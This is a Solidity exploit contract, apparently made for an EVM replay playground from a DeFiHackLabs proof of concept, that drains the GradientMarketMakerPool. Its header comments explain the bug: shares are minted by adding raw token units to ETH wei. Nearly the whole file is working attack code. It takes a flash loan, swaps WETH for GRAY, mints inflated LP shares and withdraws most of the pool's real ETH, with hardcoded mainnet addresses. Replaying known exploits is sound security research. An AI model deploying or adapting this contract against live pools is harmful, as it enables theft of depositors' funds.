// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2025-06-GradientMakerPool).
//
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this); the Morpho Blue flash-loan callback
// `onMorphoFlashLoan` lives on the test itself, `testExploit()` just calls
// `morphoBlue.flashLoan(...)`), so there is no standalone exploit contract to
// deploy. This contract is a faithful, self-contained copy of that inline
// attack so the playground can deploy it and record a single entrypoint call.
// Logic and constants are copied verbatim from test/GradientMakerPool_exp.sol
// (GradientPool.testExploit / onMorphoFlashLoan).
//
// Root cause: GradientMarketMakerPool.provideLiquidity() mints LP shares as
// `tokenAmount + msg.value` — summing raw ERC-20 base units directly with raw
// ETH wei as if 1 token unit == 1 wei. Buying a large amount of a cheap
// 18-decimal token (GRAY, worth ~0.632 ETH for 950 tokens at the pool's own
// Uniswap-reserve ratio check) and depositing it alongside that same 0.632 ETH
// mints shares as if 950.632 "units" were contributed, versus the honest pool's
// tiny 2,249.68-share base funded by ~3.02 real ETH. withdrawLiquidity() then
// pays out `totalEth * lpSharesToBurn / totalLPShares` — real ETH, pro-rata to
// the (mis-minted) shares — letting the attacker walk out with 99.68% of the
// pool's genuine ETH for a fraction of its value.

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 wad) external;
}

interface IMorphoBlueFlashLoan {
    function flashLoan(address token, uint256 assets, bytes calldata data) external;
}

interface IUniswapV2Router {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IGradientMarketMakerPool {
    function provideLiquidity(
        address token,
        uint256 tokenAmount,
        uint256 minTokenAmount
    ) external payable;

    function withdrawLiquidity(address token, uint256 shares) external;
}

contract GradientMakerPoolDrain {
    // --- constants, copied verbatim from test/GradientMakerPool_exp.sol -----
    uint256 private constant BORROW_AMOUNT = 3 ether;
    uint256 private constant WETH_WITHDRAW_AMOUNT = 1 ether;
    uint256 private constant SWAP_AMOUNT_OUT = 1000 ether;
    uint256 private constant SWAP_AMOUNT_IN_MAX = 1000 ether;
    uint256 private constant LIQUIDITY_AMOUNT = 950 ether;
    uint256 private constant WITHDRAW_SHARES = 10000;
    uint256 private constant WETH_DEPOSIT_AMOUNT = 4.010899131704627093 ether;
    uint256 private constant DEADLINE = 1750657343;
    uint256 private constant ETH_LIQUIDITY_VALUE = 632090074270700494; // wei

    IGradientMarketMakerPool internal constant gradientPool =
        IGradientMarketMakerPool(0x37Ea5f691bCe8459C66fFceeb9cf34ffa32fdadC);
    IMorphoBlueFlashLoan internal constant morphoBlue =
        IMorphoBlueFlashLoan(0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb);
    IWETH internal constant weth = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IUniswapV2Router internal constant router =
        IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    IERC20 internal constant gray = IERC20(0xa776A95223C500E81Cb0937B291140fF550ac3E4);

    /// @notice Recorded entrypoint: borrow WETH from Morpho Blue, which calls
    ///         back into onMorphoFlashLoan() to run the actual attack.
    function run() external {
        morphoBlue.flashLoan(address(weth), BORROW_AMOUNT, "");
    }

    /// @notice Morpho Blue flash-loan callback — copied verbatim from the test.
    function onMorphoFlashLoan(uint256 /* amount */, bytes calldata /* data */) external {
        // Approve Morpho for repayment
        weth.approve(address(morphoBlue), BORROW_AMOUNT);

        // Withdraw WETH to ETH
        weth.withdraw(WETH_WITHDRAW_AMOUNT);

        // Approve Uniswap router for WETH
        weth.approve(address(router), WETH_WITHDRAW_AMOUNT);

        // Swap WETH for GRAY on Uniswap
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(gray);
        router.swapTokensForExactTokens(
            SWAP_AMOUNT_OUT,
            SWAP_AMOUNT_IN_MAX,
            path,
            address(this),
            DEADLINE
        );

        // Approve GradientPool for GRAY
        gray.approve(address(gradientPool), type(uint256).max);

        // Provide liquidity to GradientPool with ETH — mints LP shares as
        // (tokenAmount + msg.value), the mixed-unit bug.
        gradientPool.provideLiquidity{value: ETH_LIQUIDITY_VALUE}(address(gray), LIQUIDITY_AMOUNT, 0);

        // Withdraw 100% of the (mis-minted) LP shares — pays out real ETH
        // pro-rata to the inflated share count.
        gradientPool.withdrawLiquidity(address(gray), WITHDRAW_SHARES);

        // Deposit ETH back to WETH for repayment
        weth.deposit{value: WETH_DEPOSIT_AMOUNT}();
    }

    // Fallback to receive ETH from WETH withdraw / pool withdrawal payout
    receive() external payable {}
}
